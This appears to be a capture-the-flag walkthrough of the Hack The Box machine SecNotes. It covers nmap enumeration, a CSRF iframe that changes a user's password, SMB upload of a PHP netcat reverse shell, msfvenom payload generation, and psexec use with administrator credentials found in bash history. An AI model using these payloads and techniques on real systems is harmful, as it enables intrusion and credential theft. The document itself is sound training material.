# SecNotes

URL: https://app.hackthebox.com/machines/SecNotes

Level: Medium

Date 29 Apr 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sat Apr 17 15:29:48 2021 as: nmap -T4 -A -p- -oN 01_nmap.txt 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up (0.044s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2021-04-17T06:32:51-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-17T13:32:52
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.49 ms 10.10.14.1
2   43.70 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 17 15:33:30 2021 -- 1 IP address (1 host up) scanned in 224.03 seconds
```

We are able to create a test user:

`
test
test123
`

If we try to create `tyler`, we get "account already taken".

It seems we are able to get some XSS:

![06_prova_con_successo_XSS](https://user-images.githubusercontent.com/42389836/157031743-ea0e5d73-fad9-495d-bdc2-1ca01ef34ee4.png)


We capture PCAP while deleting a note:

```
GET /home.php?action=delete&id=8%22 HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (Android 10; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.97/home.php
Cookie: PHPSESSID=lqpg630942tojpn9br452eje2l
Upgrade-Insecure-Requests: 1
```

and while we log in:

```
POST /login.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (Android 10; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/login.php
Cookie: PHPSESSID=lqpg630942tojpn9br452eje2l
Upgrade-Insecure-Requests: 1

username=admin&password=admin123
```

We also grab POST request while changing password:

```
POST /register.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (Android 10; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/register.php
Upgrade-Insecure-Requests: 1

username=lollor&password=lollor&confirm_password=lollor
```

We put this string in a comment:

```
<html>
<iframe src=http://10.10.10.97/change_pass.php?password=mammete&confirm_password=mammete&submit=submit"></iframe>
</html>
```

Now we can access with: 

`
tyler
mammete
`

We look at notes and we found other credentials:

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

We test with `psexec`, without success:

```
./psexec.py SECNOTES/tyler:'92g!mA8BGjOirkL%OG*&'@10.10.10.97
```

We access through SMB:

```
root@kali:/opt/impacket/examples# smbclient \\\\10.10.10.97\\new-site -U tyler
Enter WORKGROUP\tyler's password:
Try "help" to get a list of possible commands.
smb: \>
```

We manage to get a reverse shell thanks to webserver on port 8808:

```
root@kali:/opt/htb/SecNotes# cp /usr/share/windows-resources/binaries/nc.exe .

<?php
system('nc.exe -e cmd.exe 10.10.14.28 4444')
?>


root@kali:~# smbclient \\\\10.10.10.97\\new-site -U tyler
Enter WORKGROUP\tyler's password:
Try "help" to get a list of possible commands.
smb: \> put nc.exe
putting file nc.exe as \nc.exe (84.8 kb/s) (average 84.8 kb/s)
smb: \> put rev.php
putting file rev.php as \rev.php (0.1 kb/s) (average 44.8 kb/s)
smb: \>
```

```
wget  --prefer-family=IPv4 https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
```

We create an ASP reverse shell:

```
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f aspx -o test2.aspx
```

No luck.

We try with php:

```
msfvenom -p php/reverse_php LHOST=10.10.14.28 LPORT=4444 -o reverse.php
```

# User-flag

Finally we get access and we can grab user flag:

```
root@kali:/opt/htb/SecNotes# msfvenom -p php/reverse_php LHOST=10.10.14.28 LPORT=4444 -o reverse.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3023 bytes
Saved as: reverse.php
root@kali:/opt/htb/SecNotes# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.97] 51723

whoami
secnotes\tyler
pwd
'pwd' is not recognized as an internal or external command,
operable program or batch file.
cd c:\users\tyler
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of c:\users\tyler

08/19/2018  10:54 AM    <DIR>          .
08/19/2018  10:54 AM    <DIR>          ..
08/19/2018  10:49 AM                 0 .php_history
06/22/2018  04:29 AM                 8 0
08/19/2018  03:51 PM    <DIR>          3D Objects
08/19/2018  11:10 AM    <DIR>          cleanup
08/19/2018  03:51 PM    <DIR>          Contacts
08/19/2018  03:51 PM    <DIR>          Desktop
08/19/2018  03:51 PM    <DIR>          Documents
08/19/2018  03:51 PM    <DIR>          Downloads
08/19/2018  03:51 PM    <DIR>          Favorites
08/19/2018  03:51 PM    <DIR>          Links
08/19/2018  03:51 PM    <DIR>          Music
04/09/2021  06:09 AM    <DIR>          OneDrive
08/19/2018  03:51 PM    <DIR>          Pictures
08/19/2018  03:51 PM    <DIR>          Saved Games
08/19/2018  03:51 PM    <DIR>          Searches
04/09/2021  07:40 AM    <DIR>          secnotes_contacts
08/19/2018  03:51 PM    <DIR>          Videos
               2 File(s)              8 bytes
              17 Dir(s)  13,594,791,936 bytes free
cd Desktop
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of c:\users\tyler\Desktop

08/19/2018  03:51 PM    <DIR>          .
08/19/2018  03:51 PM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
04/11/2018  04:34 PM             1,142 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
04/29/2021  01:16 PM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,897 bytes
               2 Dir(s)  13,594,791,936 bytes free
type user.txt
e15823cb788b141433d39a8b90bce020
```

# Privesc

```
root@kali:/opt/htb/SecNotes# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.97] 53168
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe ls -la /root
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe cat /root/.bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
exit
```

```
root@kali:/opt/htb/SecNotes# /opt/impacket/examples/psexec.py administrator@10.10.10.97
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file jkcvqijg.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service Cvgx on 10.10.10.97.....
[*] Starting service Cvgx.....
[!] Press help for extra shell commands                                                                                                                                                      Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami                                                                                                                                                                   nt authority\system

C:\WINDOWS\system32>
```









